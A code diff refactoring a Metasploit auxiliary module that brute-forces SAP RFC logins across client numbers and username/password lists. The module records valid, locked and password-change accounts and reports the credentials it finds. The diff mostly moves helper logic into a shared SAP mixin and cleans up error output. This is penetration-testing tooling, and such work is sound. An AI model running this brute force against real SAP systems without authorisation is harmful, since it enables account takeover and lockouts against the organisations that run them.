@@ -5,24 +5,18 @@
 
 ##
 # This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
-# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
+# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
 # Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
 require 'msf/core'
-require 'rubygems'
-begin
-  require 'nwrfc'
-rescue LoadError
-  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
-end
 
 class Metasploit4 < Msf::Auxiliary
 
+  include Msf::Exploit::SAP
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::AuthBrute
-  include NWRFC
 
   def initialize
     super(
@@ -52,31 +46,6 @@ class Metasploit4 < Msf::Auxiliary
     end
 
   def run_host(ip)
-    if datastore['CLIENT'].nil?
-      print_status("Using default SAP client list")
-      clients = ['000', '001', '066']
-    else
-      if datastore['CLIENT'] =~ /^\d{3},/
-        clients = datastore['CLIENT'].split(/,/)
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif
-        datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
-        array = datastore['CLIENT'].split(/-/)
-        clients = (array.at(0)..array.at(1)).to_a
-        print_status("Brute forcing clients #{datastore['CLIENT']}")
-      elsif
-        datastore['CLIENT'] =~ /^\d{3}\z/
-        clients = datastore['CLIENT']
-        print_status("Brute forcing client #{datastore['CLIENT']}")
-      else
-        print_status("Invalid CLIENT - using default SAP client list instead")
-        clients = ['000', '001', '066']
-      end
-    end
-
-    rport = datastore['rport'].to_s.split('')
-    sysnr = rport[2]
-    sysnr << rport[3]
 
     $success = false
 
@@ -96,11 +65,11 @@ class Metasploit4 < Msf::Auxiliary
                            "status"
                           ])
 
-     clients.each { |client|
+     client_list.each do |client|
        each_user_pass do |user, pass|
-         brute_user(user,client,pass,datastore['rhost'],datastore['rport'],sysnr)
+         brute_user(user,client,pass,datastore['rhost'],datastore['rport'],system_number)
        end
-     }
+     end
 
      if $success
        print($saptbl.to_s)
@@ -123,32 +92,30 @@ class Metasploit4 < Msf::Auxiliary
      auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
      conn = Connection.new(auth_hash)
    rescue NWError => e
-     if verbose == true
-       print_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/  
-       print_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
-       print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
-       print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
-       print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
-     end
+    vprint_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/
+    vprint_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
+    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
+    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
+    vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
      $saptbl << [rhost, rport, client, user, pass, 'pass change'] if e.message =~ /Password must be changed/
      $saptbl << [rhost, rport, client, user, pass, 'locked'] if e.message =~ /Password logon no longer possible - too many failed attempts/
      return
    end
-   
+
    begin
-     conn_info = conn.connection_info
+     conn.connection_info
      $saptbl << [rhost, rport, client, user, pass, '']
-     success = true
+     $success = true
    rescue
      print_error("#{rhost}:#{rport} [SAP] something went wrong :(")
      return
    end
-   
+
    conn.disconnect
-   
+
    $success = true
-   
-   if $success 
+
+   if $success
      report_auth_info(
                       :host => rhost,
                       :sname => 'sap-gateway',
@@ -165,3 +132,4 @@ class Metasploit4 < Msf::Auxiliary
     end
   end
 end
+
